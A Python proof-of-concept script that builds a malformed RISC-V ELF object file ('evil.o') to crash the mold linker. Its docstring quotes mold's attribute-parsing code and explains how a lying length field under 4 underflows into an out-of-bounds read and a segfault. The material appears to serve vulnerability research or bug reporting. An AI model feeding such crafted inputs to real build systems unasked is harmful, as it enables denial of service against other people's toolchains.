#!/usr/bin/env python3
"""Writes a minimal RV64LE ET_REL ELF object with a ".riscv.attributes"
section (SHT_RISCV_ATTRIBUTES) whose sub-section length field ("sz") lies
about its own value.

mold's read_riscv_attributes() (src/input-files.cc, ~line 187) does:

    i64 sz = *(U32<E> *)data.data();
    if (data.size() < sz)
      Fatal(ctx) << file << ": corrupted .riscv.attributes section";

    std::string_view p(data.data() + 4, sz - 4);
    data = data.substr(sz);

The upper-bound check (`data.size() < sz`) never rejects a SMALL sz - if
sz is 0, 1, 2, or 3, `sz - 4` underflows (i64 -4..-1, converted to the
huge size_t std::string_view expects), so `p` is constructed as a
~2^64-byte view starting 4 bytes into the section. Every subsequent read
through `p` (the "riscv\0" vendor-name check, the ELF_TAG_FILE check, the
inner ULEB128 tag/value loop) then walks straight off the mapped file,
eventually running past the last page mold's mmap() actually backs -
segfault.

To guarantee the code actually enters the vulnerable branch (rather than
bailing out early on the "riscv\0" vendor-name mismatch), the real bytes
placed right after the 4-byte "sz" field spell out a syntactically valid
"riscv\0" vendor name + ELF_TAG_FILE sub-section header + one well-formed
ULEB128 tag/value pair - so the parser walks forward from there, byte by
byte, through legitimate-looking content, then through the zero-padding
mold's page-rounding leaves at the end of the mmap'd file, until it runs
off the actual mapped region entirely.
"""
import struct
import sys


def build() -> bytes:
    e_ident = b"\x7fELF" + bytes([2, 1, 1, 0]) + b"\x00" * 8  # ELFCLASS64, ELFDATA2LSB

    # .riscv.attributes section body:
    #   [0]     'A'                      format-version
    #   [1:5]   sz = 2   (LIE: real sub-section content below is far longer than 2 bytes;
    #                      sz - 4 underflows to a huge size_t)
    #   [5:11]  "riscv\0"                vendor name (so the vendor-name check passes)
    #   [11]    0x01                     ELF_TAG_FILE
    #   [12:16] sub-sub-section size (unused by the parser beyond being skipped)
    #   [16]    0x04                     ULEB128 tag = ELF_TAG_RISCV_STACK_ALIGN
    #   [17]    0x08                     ULEB128 value = 8
    # After this, the underflowed `p` view (sz-4 = huge) keeps being read by the inner
    # `while (!p.empty())` loop well past this section's real content, through
    # mmap's zero-padded page tail, and then off the actual mapped region.
    attr_body = (
        b"A"
        + struct.pack("<I", 2)          # sz = 2 (< 4 -> underflow)
        + b"riscv\x00"
        + bytes([1])                    # ELF_TAG_FILE
        + struct.pack("<I", 0)          # sub-sub-section size (unused/unchecked)
        + bytes([4])                    # ULEB128 tag: ELF_TAG_RISCV_STACK_ALIGN
        + bytes([8])                    # ULEB128 value: 8
    )

    shstrtab = b"\x00.riscv.attributes\x00.shstrtab\x00"
    name_attr = 1
    name_shstrtab = 1 + len(".riscv.attributes") + 1

    off_attr = 64
    off_shstrtab = off_attr + len(attr_body)
    off_shdrs = off_shstrtab + len(shstrtab)
    pad = (-off_shdrs) % 8
    off_shdrs += pad

    SHT_RISCV_ATTRIBUTES = 0x70000003

    ehdr = e_ident + struct.pack(
        "<HHIQQQIHHHHHH",
        1,    # e_type = ET_REL
        243,  # e_machine = EM_RISCV
        1,    # e_version
        0,    # e_entry
        0,    # e_phoff
        off_shdrs,  # e_shoff
        0,    # e_flags
        64,   # e_ehsize
        0,    # e_phentsize
        0,    # e_phnum
        64,   # e_shentsize
        3,    # e_shnum
        2,    # e_shstrndx
    )
    assert len(ehdr) == 64

    def shdr(name, type_, flags, offset, size):
        return struct.pack("<IIQQQQIIQQ", name, type_, flags, 0, offset, size, 0, 0, 1, 0)

    sh_null = shdr(0, 0, 0, 0, 0)
    sh_attr = shdr(name_attr, SHT_RISCV_ATTRIBUTES, 0, off_attr, len(attr_body))
    sh_shstrtab = shdr(name_shstrtab, 3, 0, off_shstrtab, len(shstrtab))  # SHT_STRTAB

    return ehdr + attr_body + shstrtab + b"\x00" * pad + sh_null + sh_attr + sh_shstrtab


def main() -> None:
    out_path = sys.argv[1] if len(sys.argv) > 1 else "evil.o"
    with open(out_path, "wb") as f:
        f.write(build())


if __name__ == "__main__":
    main()
